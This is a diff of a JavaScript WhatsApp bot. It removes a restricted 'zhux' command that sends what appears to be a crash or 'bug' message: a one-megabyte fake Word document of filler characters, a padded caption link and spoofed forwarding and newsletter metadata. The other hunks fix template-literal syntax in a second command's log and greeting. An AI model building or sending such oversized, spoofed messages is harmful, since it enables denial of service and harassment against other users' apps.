@@ -213,94 +213,6 @@ const wait = "⏳ tunggu bentar...";
  
     switch (command) {
 
-case "zhux": {
-const allowedUsers = [
-"269544178327708@lid"
-];
-const sender = m.key.participant || m.key.remoteJid;
-const userCommand = command || "unknown";
-const userTime = new Date().toLocaleTimeString("id-ID", { hour12: false });
-const start = Date.now();
-const end = Date.now();
-const speed = end - start;
-console.log(
-chalk.white("\n") + "┏╾" + "<💭>" + "[" + "" +
-chalk.bgGreen.black("𝗖𝗢𝗠𝗠𝗔𝗡𝗗") + "" +
-chalk.white("]") + " " +
-chalk.cyan.bold(`.${userCommand}`) + " <⏰>" +
-chalk.bgGray.white.bold(`[${userTime}]`) + " " +
-chalk.white(" ") + " " +
-chalk.white("\n") + "┣" + 
-chalk.yellow.bold(`[ ${sender} ]`) + " " + "©𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶" +
-chalk.white("\n") + "┗╾≫" + " " +
-chalk.white("[") + "" +
-chalk.bgRed.black("々") +
-chalk.white("]") + " " +
-chalk.white.bold("Sending with out message . . .") + " "
-);
-if (!allowedUsers.includes(sender)) {
-await sock.sendMessage(
-m.key.remoteJid,
-{
-text: "*g ad akses lu*",
-},
-{ quoted: fakeStickerPackQuoted }
-);
-break;
-}
-const thumbPath = "./image/whns.jpg";
-const thumbExists = fs.existsSync(thumbPath);
-const thumbBuffer = thumbExists ? fs.readFileSync(thumbPath) : null;
-const text = "https://ẉ.ceo/zhuxz" + "".repeat(25252);
-const suki = {
-title: "𝗱𝟳𝗲𝗽𝗽𝗲𝗹𝗶.𝗽𝗱𝗳",
-body: "© 2025 - 2026",
-thumbnail: thumbBuffer,
-sourceUrl: "t.me/xvoldz",
-mediaType: 1,
-renderLargerThumbnail: false,
-};
-const footer = "t.me/d7eppeli";
-const fakeDoc = Buffer.alloc(100 * 100 * 100, "㑒 `𝐅𝐮𝐜𝐤𝐙𝐡𝐮𝐱 || 𝐒𝐢𝐠𝐦𝐚 𝐁𝐨𝐲𝐬 🥵");
-const mentions = ['status@broadcast'];
-await sock.sendMessage(m.key.remoteJid, { react: { text: "⏳", key: m.key } });
-await sock.sendMessage(
-m.key.remoteJid,
-{
-document: fakeDoc,
-mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
-fileName: "© 𝗭𝗵𝘂𝗫𝘇 𝘃𝟬.𝟮",
-caption: text,
-footer: footer,
-contextInfo: { 
-externalAdReply: suki,
-mentionedJid: mentions,
-ai: false,
-forwardingScore: 252,
-isForwarded: true,
-businessMessageForwardInfo: { 
-businessOwnerJid: "13135550002@s.whatsapp.net" },
-forwardedNewsletterMessageInfo: {
-newsletterJid: "120363405191556298@newsletter",
-newsletterName: "🕊️-𝗭𝗵𝘂𝗫𝘇 𝗚𝗻𝗫𝘇-".repeat(1),
-serverMessageId: null
-},
-},
-},
-{ quoted: statusMessage }
-);
-await sock.sendMessage(m.key.remoteJid, { react: { text: "🌟", key: m.key } });
-console.log(
-chalk.white(" ") + " " +
-chalk.white("[") + "" +
-chalk.bgBlue.black("𝗦𝗧𝗔𝗧𝗨𝗦") + "" +
-chalk.white("]") + " " + "<" +
-chalk.bgGreen.black("✅") + ">" + " " +
-chalk.white.bold("Successfully Send Message . . .") + " "
-);
-break;
-}
-
 case 'balzx': {
 const jid = m.key.remoteJid
 const sender = m.key.participant || jid
@@ -318,11 +230,11 @@ console.log(
 chalk.white("\n") + "┏╾" + "<💭>" + "[" + "" +
 chalk.bgGreen.black("𝗖𝗢𝗠𝗠𝗔𝗡𝗗") + "" +
 chalk.white("]") + " " +
-chalk.cyan.bold(.${userCommand}) + " <⏰>" +
-chalk.bgGray.white.bold([${userTime}]) + " " +
+chalk.cyan.bold(`${userCommand}`) + " <⏰>" +
+chalk.bgGray.white.bold(`[${userTime}]`) + " " +
 chalk.white(" ") + " " +
 chalk.white("\n") + "┣" +
-chalk.yellow.bold([ ${sender} ]) + " " + "©𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶" +
+chalk.yellow.bold(`[ ${sender} ]`) + " " + "©𝗥𝗲𝘅𝘇𝗦𝘂𝗸𝗶" +
 chalk.white("\n") + "┗╾≫" + " " +
 chalk.white("[") + "" +
 chalk.bgRed.black("々") +
@@ -353,13 +265,13 @@ await sock.sendMessage(
 jid,
 {
 image: Buffer.from(img.data),
-caption: > *\💥` -𝗭𝗵𝘂𝗫𝘇𝗩𝗼.𝟵𝟬𝟴?!*
+caption: `> *\`💥\` -𝗭𝗵𝘂𝗫𝘇𝗩𝗼.𝟵𝟬𝟴?!*
 -Привет! @${userTag}-
 Я ассистент готовый
 помочь вам решить
 вашу проблему.
 
-➥ `𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡`
+➥ \`𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡\`
 ❐- 𝗗𝗲𝘃: ZhuXzVo?!
 -❐ 𝗩𝗲𝗿: 0.2-Beta
 ❐- 𝗕𝗮𝘀𝗲: ESM/CASE
